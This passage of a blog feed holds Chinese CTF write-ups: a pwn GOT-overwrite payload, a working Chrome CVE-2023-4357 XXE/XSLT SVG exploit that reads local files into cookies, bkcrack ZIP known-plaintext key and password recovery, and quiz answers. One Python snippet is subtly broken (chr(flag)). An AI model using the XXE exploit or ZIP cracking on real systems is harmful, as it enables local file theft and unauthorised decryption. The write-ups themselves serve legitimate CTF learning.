p.recvuntil(b&#x27;?\n&#x27;)</span><br><span class="line"></span><br><span class="line">12 payload = p64(backdoor) + b&#x27;b&#x27; * 0xa0 + p64(chk_got)</span><br><span class="line"></span><br><span class="line">13 p.sendline(payload.ljust(0x150, b&#x27;a&#x27;))</span><br><span class="line"></span><br><span class="line">14</span><br><span class="line"></span><br><span class="line">15 p.interactive()</span><br></pre></td></tr></table></figure><h3 id="What-only-libc"><a href="#What-only-libc" class="headerlink" title="What?!only libc?!"></a>What?!only libc?!</h3><h3 id="TalBoom"><a href="#TalBoom" class="headerlink" title="TalBoom"></a>TalBoom</h3><p><em>出题⼈：TokameinE</em></p><p><em>题⽬描述：我们从来奉⾏没有政策就是我们的政策，所以我们打算什么也不做，任由恐怖分⼦们闹</em>吧。（本题有回显，连接后请稍作等待）*</p><p>flag：Toka{Who_has_four_legs_in_the_morning_two_legs_at_noon_and_three_legs_in_theevening?}本题不公布任何附件。</p><p>看了⼀下⼤哥们的解法，⾮常优秀，所以在此就不公开预期解 exp 了，主要聊聊⾮预期的⼀个好办</p><p>法，来⾃Kalise师傅。</p><p>题⽬每次nc 都会构建不同的⼆进制，⽽每个⼆进制都有⼀个明显的栈溢出漏洞点，如果能够让程序到</p><p>达，则可以直接ROP完成利⽤。但是问题在于，到达的输⼊每次都是随机的，因此预期解是需要通过</p><p>⾃动化的⼿段动态分析程序来解出输⼊。但是Kalise师傅的⽅法则很简单，由于程序是类似于 Switch 的分发⽅式，所以每个⼆进制⽂件实际上</p><p>之只有那个strcmp是不同的，⽽偏移则全部相同，那么只要对着某个分⽀强⾏爆破，在预期的时间内</p><p>就可以撞出那个栈溢出，⽽只需要提取特定地址的字符串就能拿到该分⽀的输⼊，所以瞄着打就⾏</p><p>了。据该师傅所说，15分钟左右即可完成爆破。</p><p>这⾥就不放这位师傅的 exp 了</p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="Baby-c"><a href="#Baby-c" class="headerlink" title="Baby_c++"></a>Baby_c++</h3><p>咱也不知道怎么回事，打开IDA，查找字符串就看到了</p><p>预期是找到flag</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">flag = [<span class="number">83</span>,<span class="number">73</span>,<span class="number">67</span>,<span class="number">84</span>,<span class="number">70</span>,<span class="number">123</span>,<span class="number">52</span>,<span class="number">101</span>,<span class="number">52</span>,<span class="number">55</span>,<span class="number">52</span>,<span class="number">98</span>,<span class="number">56</span>,<span class="number">97</span>,<span class="number">45</span>,<span class="number">57</span>,<span class="number">100</span>,<span class="number">102</span>,<span class="number">54</span>,<span class="number">45</span>,<span class="number">52</span>,<span class="number">53</span>,<span class="number">52</span>,<span class="number">98</span>,<span class="number">45</span>,<span class="number">57</span>,<span class="number">101</span>,<span class="number">97</span>,<span class="number">54</span>,<span class="number">45</span>,<span class="number">100</span>,<span class="number">52</span>,<span class="number">102</span>,<span class="number">53</span>,<span class="number">101</span>,<span class="number">51</span>,<span class="number">55</span>,<span class="number">99</span>,<span class="number">100</span>,<span class="number">53</span>,<span class="number">49</span>,<span class="number">102</span>,<span class="number">125</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(flag),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="Ez-pyc"><a href="#Ez-pyc" class="headerlink" title="Ez_pyc"></a>Ez_pyc</h3><p>pyc编译</p><p>（真服了，一直想着是走迷宫，，，，这么明显都没看出来是数独</p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240226125713782.png" alt="image-20240226125713782"></p><p>将解转为16进制</p><p>输⼊内容：</p><p>6320870e5352469014668584c7f3229334e22689b45a64f926b5c</p><p>得到flag</p><h3 id="SweetTofu"><a href="#SweetTofu" class="headerlink" title="SweetTofu"></a>SweetTofu</h3><p>远程动态调试可以，，我在想。虚拟机好啊。。</p><h3 id="virus-n-lys1s"><a href="#virus-n-lys1s" class="headerlink" title="virus-?n?lys1s"></a>virus-?n?lys1s</h3><p>#校验php，strpos()因为php版本太低了，web佬绕过</p><ul><li>esp定律脱壳</li><li>第二问记得挂代理（google（断</li><li>动调</li><li>启动子进程，类似于SMC的⼿段，来解密⽂件并且修复⽂件头</li><li>行为记录，wyt.exe,翻VT信息</li><li>直接微步情报（动态IP</li></ul><p><a href="https://s.threatbook.com/report/file/797c253df096431e69f1aa84f0010f248384fe437cda4bf8df916c48fbb7984f">https://s.threatbook.com/report/file/797c253df096431e69f1aa84f0010f248384fe437cda4bf8df916c48fbb7984f</a></p><h3 id="Close-me"><a href="#Close-me" class="headerlink" title="Close me"></a>Close me</h3><p><em>❤</em>*<del>杂</del>⻥~<strong>❤</strong>，你能关的掉吗~~<strong>❤</strong>（虽然不是病毒，不过如果要运⾏的话还是建议虚拟机吧*<em>^_^）</em></p><p><em>请找到能够正常关闭的条件（即不通过直接终⽌进程的⽅式或者程序崩溃导致的关闭）</em></p><h4 id="法一："><a href="#法一：" class="headerlink" title="法一："></a>法一：</h4><p>⾸先翻到下⾯发现有⼀个xor，解密⼀下看看得到⼀段hint</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;SICTF2024&quot;&gt;&lt;a href=&quot;#SICTF2024&quot; class=&quot;headerlink&quot; title=&quot;SICTF2024&quot;&gt;&lt;/a&gt;SICTF2024&lt;/h1&gt;&lt;h2 id=&quot;Forensics&quot;&gt;&lt;a href=&quot;#Forensics&quot; class</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>躺平杯</title>
    <link href="https://github.com/xyy9233/xyy9233.github.io.git/2024/02/26/tpcup2024/"/>
    <id>https://github.com/xyy9233/xyy9233.github.io.git/2024/02/26/tpcup2024/</id>
    <published>2024-02-25T16:00:00.000Z</published>
    <updated>2024-03-02T08:33:39.565Z</updated>
    
    <content type="html"><![CDATA[<h1 id="TPCUP-2024"><a href="#TPCUP-2024" class="headerlink" title="TPCUP 2024"></a>TPCUP 2024</h1><h2 id="X…什么？"><a href="#X…什么？" class="headerlink" title="X…什么？"></a>X…什么？</h2><p>看到 chrome-114.0.5735.90 搜索下这个版本可以找到 CVE-2023-4357 漏洞复现，使用 <a href="https://github.com/xcanwin/CVE-2023-4357-Chrome-XXE">xcanwin&#x2F;CVE-2023-4357-Chrome-XXE</a> 的单文件 EXP，改成读取 flag，然后加上写入 cookies 的代码。</p><p>由于同时要有 svg 和 xml 解析，所以 Content-Type 设为 <code>image/svg+xml</code>，可以自己搭建本地环境看看</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- d.svg --&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml-stylesheet type=<span class="string">&quot;text/xsl&quot;</span> href=<span class="string">&quot;?#&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">div</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">passwd_p</span> <span class="string">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">passwd_c</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:stylesheet</span> <span class="attr">xmlns:xsl</span>=<span class="string">&quot;http://www.w3.org/1999/XSL/Transform&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.0&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">&quot;/&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xsl:copy-of</span> <span class="attr">select</span>=<span class="string">&quot;document(&#x27;&#x27;)&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/1999/xhtml&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;display:none&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;&amp;passwd_p;&quot;</span>&gt;</span>&amp;passwd_c;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;width:40rem&quot;</span> <span class="attr">id</span>=<span class="string">&quot;r&quot;</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;p&#x27;</span>).<span class="title function_">forEach</span>(p =&amp;gt; &#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="variable language_">document</span>.<span class="property">cookie</span>=p.<span class="property">innerHTML</span>;</span></span><br><span class="line"><span class="language-javascript">        &#125;);</span></span><br><span class="line"><span class="language-javascript">      </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:stylesheet</span>&gt;</span></span><br></pre></td></tr></table></figure><p>上传后访问 <code>/d.svg</code> 即可</p><p><code>flag&#123;XXE_is_alSo_y0ur_g0oD_fR13Nd&#125;</code></p><blockquote><p>没修前已经能读 <code>/etc/passwd</code> 了，但读 <code>/flag</code> 没结果。以为是没权限需要提权，结果是没放 flag（<br>话说为什么读得了 <code>/usr/src/app/requirements.txt</code> 但读不了 <code>xssbot.py</code> 呢</p></blockquote><h2 id="Uncrackable"><a href="#Uncrackable" class="headerlink" title="Uncrackable"></a>Uncrackable</h2><h3 id="更新附件后"><a href="#更新附件后" class="headerlink" title="更新附件后"></a>更新附件后</h3><p>zip 已知明文攻击，用 <code>zipinfo</code> 查看下压缩包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">❯ zipinfo prob05.zip</span><br><span class="line">Archive:  prob05.zip</span><br><span class="line">Zip file size: 3545476 bytes, number of entries: 2</span><br><span class="line">-rw----     0.0 fat   109332 T- defN 24-Feb-13 18:53 anticheat.js</span><br><span class="line">-rw----     0.0 fat  3550103 B- defN 24-Feb-13 18:53 uncrackable.m4a</span><br><span class="line">2 files, 3659435 bytes uncompressed, 3545224 bytes compressed:  3.1%</span><br></pre></td></tr></table></figure><p><code>anticheat.js</code> 文件是已知的，可以从 <a href="https://www.tpcup.org/anticheat.js">https://www.tpcup.org/anticheat.js</a> 下载，需要压缩后才可以用工具 (bkcrack&#x2F;rbkcrack&#x2F;pkcrack) 爆破密钥</p><p>这题和压缩工具关系很大，使用 <code>pyminizip == 0.2.6</code> 在 <code>compress_level = 0 or 6</code> 下可以成功，<code>zip = 3.0-11.1</code> 和 <code>7z = 23.01</code> 均失败 <del>，还是在群聊中得知的压缩工具</del></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># crypto.py</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pyminizip</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;level:<span class="subst">&#123;i&#125;</span>&quot;</span>)</span><br><span class="line">    pyminizip.compress(<span class="string">&quot;anticheat.js&quot;</span>, <span class="literal">None</span>, <span class="string">&quot;anticheat.zip&quot;</span>, <span class="literal">None</span>, i)</span><br><span class="line">    <span class="comment"># os.system(&quot;zip -%d anticheat.zip anticheat.js &gt; /dev/null&quot; % (i))</span></span><br><span class="line">    <span class="comment"># os.system(&quot;7z a -tzip -mx%d anticheat.zip anticheat.js &gt; /dev/null&quot; % (i))</span></span><br><span class="line">    os.system(<span class="string">&quot;bkcrack -C prob05.zip -c anticheat.js -P anticheat.zip -p anticheat.js&quot;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">❯ python crypto.py</span><br><span class="line">level:0</span><br><span class="line">bkcrack 1.6.1 - 2024-01-22</span><br><span class="line">[21:59:49] Z reduction using 44370 bytes of known plaintext</span><br><span class="line">26.0 % (11536 / 44370)</span><br><span class="line">[21:59:50] Attack on 155 Z values at index 33459</span><br><span class="line">Keys: d0043c88 20e5781d 2160b96d</span><br><span class="line">94.8 % (147 / 155)</span><br><span class="line">Found a solution. Stopping.</span><br><span class="line">You may resume the attack with the option: --continue-attack 147</span><br><span class="line">[21:59:50] Keys</span><br><span class="line">d0043c88 20e5781d 2160b96d</span><br></pre></td></tr></table></figure><p>用密钥获取压缩包密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">❯ bkcrack -C prob05.zip -c uncrackable.m4a -k d0043c88 20e5781d 2160b96d -b \?a -l 12</span><br><span class="line">bkcrack 1.6.1 - 2024-01-22</span><br><span class="line">[22:42:55] Recovering password</span><br><span class="line">length 12...</span><br><span class="line">Password: bQCvRH7q1ULs</span><br><span class="line">60.4 % (2321 / 3844)</span><br><span class="line">Found a solution. Stopping.</span><br><span class="line">You may resume the password recovery with the option: --continue-recovery 625151303030</span><br><span class="line">[22:42:59] Password</span><br><span class="line">as bytes: 62 51 43 76 52 48 37 71 31 55 4c 73</span><br><span class="line">as text: bQCvRH7q1ULs</span><br></pre></td></tr></table></figure><p>用密码解压之后查看 uncrackable.m4a 末尾的附加字符 <code>strings uncrackable.m4a | grep flag</code></p><p><code>flag&#123;z1p_IsN7_5ucH_S4f3&#125;</code></p><h3 id="下面是之前的附件的错误解法"><a href="#下面是之前的附件的错误解法" class="headerlink" title="下面是之前的附件的错误解法"></a>下面是之前的附件的错误解法</h3><p>之前的附件，给出提示部分 M4A 头字节(摩斯密码，五位一组) <code>7479706d7000000</code> 补个 0 就有 8 位，我以为是这个是压缩后的，猜测前三位是 <code>000000</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">❯ bkcrack -C prob05.zip -c 70.m4a -p 70.txt -o 5 -x 0 000000</span><br><span class="line">bkcrack 1.6.1 - 2024-01-22</span><br><span class="line">[00:47:57] Attack on 4194304 Z values at index 12</span><br><span class="line">Keys: 5bb795f4 424af6b2 acadf670</span><br><span class="line">43.6 % (1828975 / 4194304)</span><br><span class="line">Found a solution. Stopping.</span><br><span class="line">You may resume the attack with the option: --continue-attack 1828975</span><br><span class="line">[01:02:46] Keys</span><br><span class="line">5bb795f4 424af6b2 acadf670</span><br></pre></td></tr></table></figure><p>可以爆出密钥（但是是错误的），所以最后解密压缩包的时候提示文件损坏 <code>zlib.error: Error -3 while decompressing data: invalid stored block lengths</code> 可惜</p><h3 id="下面可能是正确的解法"><a href="#下面可能是正确的解法" class="headerlink" title="下面可能是正确的解法"></a>下面可能是正确的解法</h3><p>zip 明文攻击至少需要 12 位字符，其中 8 位要连续<br>这个压缩包的 <code>compress_level == 5</code>，提示的是 M4A 头，但不是连续的。第 0-2 位是 <code>000000</code>，搜索文件头可以查到第 3 位一般是 <code>20</code>，但我生成了一个文件第 3 位是 <code>1C</code>。。。<br>第 4-9 位是 <code>667479706070</code> 就是提示的，但现在只有 10 位，还需要两位。可以随机抓后面的空白部分来补充位数，之后就可能可以正常爆破密钥了（没爆出来</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">❯ python crypto.py</span><br><span class="line">level:5</span><br><span class="line">bkcrack 1.6.1 - 2024-01-22</span><br><span class="line">[22:16:14] Z reduction using 1048569 bytes of known plaintext</span><br><span class="line">0.8 % (8070 / 1048569)</span><br><span class="line">[22:16:15] Attack on 130 Z values at index 1041024</span><br><span class="line">Keys: a08fc77f 1dd36012 734e2126</span><br><span class="line">76.2 % (99 / 130)</span><br><span class="line">Found a solution. Stopping.</span><br><span class="line">You may resume the attack with the option: --continue-attack 99</span><br><span class="line">[22:16:15] Keys</span><br><span class="line">a08fc77f 1dd36012 734e2126</span><br></pre></td></tr></table></figure><p>压缩包密码是：<code>D0mbgaf6OhNp</code> 解密即可</p><blockquote><p>uncrackable.m4a 是周深的 Unstoppable （挺配的</p></blockquote><h2 id="非常好忽悠混合"><a href="#非常好忽悠混合" class="headerlink" title="非常好忽悠混合"></a>非常好忽悠混合</h2><p>flag1 找个哔站视频下载的解析下原始标题得到（在去年的时候就知道了<br>flag2 在视频的第二帧出现（一眼</p><p><code>flag&#123;h0W_d0_y0U_kN0w_mY_V1d3O_n4M3&#125;</code><br><code>flag&#123;f1Nd_7H3_f14g_iN_Th3_S3c0nD_fr4m3&#125;</code></p><h2 id="心中无码，自然高清"><a href="#心中无码，自然高清" class="headerlink" title="心中无码，自然高清"></a>心中无码，自然高清</h2><p>这题是连蒙带猜的，基本思路就是遍历字符生成马赛克，看和密文是否一致（或误差很小）<br>到下划线要更改 44&#x2F;45 行，为 <code>ll = len(flag) - 1</code> 调整枚举中间位置，如果为空可以跳过，这样能得到 <code>flag&#123;lag&#123;ev3R tH1</code> 如果没有结果可以把 50 行取消注释，输出差别较小的字母，再猜下能还原 flag</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image, ImageDraw, ImageFont, ImageChops</span><br><span class="line">k = <span class="number">0</span></span><br><span class="line">flag = <span class="string">r&#x27;flag&#123;&#x27;</span></span><br><span class="line"><span class="keyword">while</span> k &lt; <span class="number">255</span>:</span><br><span class="line">    k += <span class="number">1</span></span><br><span class="line">    flag += <span class="built_in">chr</span>(k)</span><br><span class="line"></span><br><span class="line">    H = <span class="number">68</span></span><br><span class="line">    W = <span class="number">34</span></span><br><span class="line"></span><br><span class="line">    canvas = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (W * <span class="built_in">len</span>(flag), H), (<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>))</span><br><span class="line">    font = ImageFont.truetype(</span><br><span class="line">        <span class="string">&#x27;./JetBrainsMono-Regular.ttf&#x27;</span>, <span class="number">56</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    pen = ImageDraw.Draw(canvas)</span><br><span class="line">    pen.text((<span class="number">0</span>, <span class="number">0</span>), flag, <span class="string">&#x27;black&#x27;</span>, font)</span><br><span class="line"></span><br><span class="line">    canvas.save(<span class="string">&#x27;flag_uncensored.png&#x27;</span>, <span class="built_in">format</span>=<span class="string">&#x27;png&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">        char = canvas.crop((W * i, <span class="number">0</span>, W * (i + <span class="number">1</span>), H))</span><br><span class="line">        char.save(<span class="string">f&#x27;./tmp_char/char_<span class="subst">&#123;i&#125;</span>.png&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">mosaic_img</span>(<span class="params">img: Image.Image, L, H, R, D</span>):</span><br><span class="line">        w, h = R - L, D - H</span><br><span class="line">        a = [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line">        cnt = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(w):</span><br><span class="line">            <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(h):</span><br><span class="line">                j = img.getpixel((L + x, H + y))</span><br><span class="line">                <span class="keyword">for</span> ch <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">                    a[ch] += j[ch]</span><br><span class="line">                cnt += <span class="number">1</span></span><br><span class="line">        b = [k // cnt <span class="keyword">for</span> k <span class="keyword">in</span> a]</span><br><span class="line">        mosaic = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (w, h), <span class="built_in">tuple</span>(b))</span><br><span class="line">        img.paste(mosaic, (L, H, R, D))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>, <span class="built_in">len</span>(flag)):</span><br><span class="line">        mosaic_img(canvas, W * i, <span class="number">0</span>, W * i + W, H // <span class="number">2</span>)</span><br><span class="line">        mosaic_img(canvas, W * i, H // <span class="number">2</span>, W * i + W, H)</span><br><span class="line"></span><br><span class="line">    canvas.save(<span class="string">&#x27;flag_censored.png&#x27;</span>, <span class="built_in">format</span>=<span class="string">&#x27;png&#x27;</span>)</span><br><span class="line">    f = Image.<span class="built_in">open</span>(<span class="string">&#x27;./70.png&#x27;</span>)</span><br><span class="line">    censored = Image.<span class="built_in">open</span>(<span class="string">&#x27;./flag_censored.png&#x27;</span>)</span><br><span class="line">    ll = <span class="built_in">len</span>(flag)</span><br><span class="line">    <span class="comment"># ll = len(flag) - 1</span></span><br><span class="line">    cropped_region = f.crop((W * (ll - <span class="number">1</span>), <span class="number">0</span>, W * ll, H // <span class="number">2</span>))</span><br><span class="line">    censored_cropped = censored.crop((W * (ll - <span class="number">1</span>), <span class="number">0</span>, W * ll, H // <span class="number">2</span>))</span><br><span class="line">    diff = ImageChops.difference(censored_cropped, cropped_region)</span><br><span class="line">    <span class="keyword">if</span> diff.getextrema()[<span class="number">0</span>][<span class="number">0</span>] == <span class="number">0</span> <span class="keyword">and</span> diff.getextrema()[<span class="number">1</span>][<span class="number">0</span>] == <span class="number">0</span> <span class="keyword">and</span> diff.getextrema()[<span class="number">2</span>][<span class="number">0</span>] == <span class="number">0</span>:</span><br><span class="line">        <span class="comment"># print(&quot;not best&quot;, chr(k), diff.getextrema())</span></span><br><span class="line">        cropped_region = f.crop((W * (ll - <span class="number">1</span>), H // <span class="number">2</span>, W * ll, H))</span><br><span class="line">        censored_cropped = censored.crop((W * (ll - <span class="number">1</span>), H // <span class="number">2</span>, W * ll, H))</span><br><span class="line">        diff = ImageChops.difference(censored_cropped, cropped_region)</span><br><span class="line">        <span class="keyword">if</span> diff.getextrema()[<span class="number">0</span>][<span class="number">0</span>] == <span class="number">0</span> <span class="keyword">and</span> diff.getextrema()[<span class="number">1</span>][<span class="number">0</span>] == <span class="number">0</span> <span class="keyword">and</span> diff.getextrema()[<span class="number">2</span>][<span class="number">0</span>] == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">chr</span>(k), diff.getextrema())</span><br><span class="line">    flag = flag[:-<span class="number">1</span>]</span><br></pre></td></tr></table></figure><p><code>flag&#123;ev3RytH1ng_1s_Cl3Ar&#125;</code></p><h2 id="躺平问答"><a href="#躺平问答" class="headerlink" title="躺平问答"></a>躺平问答</h2><blockquote><p>上周，身为2024届英才计划培养对象的出题人ZianTT参加了一次冬令营，请问他的活动大致地点是？（七个汉字）</p></blockquote><p>不会有人不止到 HIT 吧（</p><blockquote><p>在2023年，Cloudflare因为机房停电导致大量服务不可用，Cloudflare官方博客记载此时的英文版链接是：</p></blockquote><p>如何干翻 CloudFlare？给它的数据中心拉闸（，在 cf 的 blog 可以找到 （或者直接搜</p><blockquote><p>QQ上线了新春活动，但糟糕的体验显然引发了一些用户的困扰，关闭该功能的链接是？（一个由https:&#x2F;&#x2F;开始的链接）</p></blockquote><p>这是最后才出的题，本来以为要前几年的关闭入口，结果填今年的表单就行，在 QA 群里可以找到</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">提示</span><br><span class="line">QQ 春节活动关闭登记表</span><br><span class="line">https://docs.qq.com/form/page/DUWl2cXN2WktZVWlB</span><br><span class="line">设置 - 关于 QQ 与帮助 - 反馈 - 「如何关闭春节红包活动」</span><br><span class="line">2024-02-06</span><br><span class="line">15.6K viewsedited  </span><br><span class="line">12:29</span><br></pre></td></tr></table></figure><blockquote><p>HTCPCP是一种类似HTTP的协议，用于控制咖啡壶，其中，当发送了BREW请求来冲泡的时候，如果服务认为请求的添加项组合违背了饮酒者对所述种类的共识，返回的状态码是：</p></blockquote><p>懒得看就把文档的状态码都试下</p><blockquote><p>OpenAI在2024年1月发生了多少运行事件(以公示数据为准 )：</p></blockquote><p>goto <a href="https://status.openai.com/history">https://status.openai.com/history</a> 数下一月份的数据</p><blockquote><p>比赛平台域名tpcup.org的Registry Domain ID 是：</p></blockquote><p>在 <a href="https://lookup.icann.org/en/lookup">https://lookup.icann.org/en/lookup</a> 查到</p><blockquote><p>本次比赛计算服务提供商所在主体纳税人识别号是：（18位由数字和大写字母组成的字符串）</p></blockquote><p>赞助商是晞云，在官网给出了公司名，搜索一下纳税人识别号就行</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;token&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;ans_1&quot;</span><span class="punctuation">:</span><span class="string">&quot;哈尔滨工业大学&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;ans_2&quot;</span><span class="punctuation">:</span><span class="string">&quot;https://blog.cloudflare.com/post-mortem-on-cloudflare-control-plane-and-analytics-outage&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;ans_3&quot;</span><span class="punctuation">:</span><span class="string">&quot;https://docs.qq.com/form/page/DUWl2cXN2WktZVWlB&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;ans_4&quot;</span><span 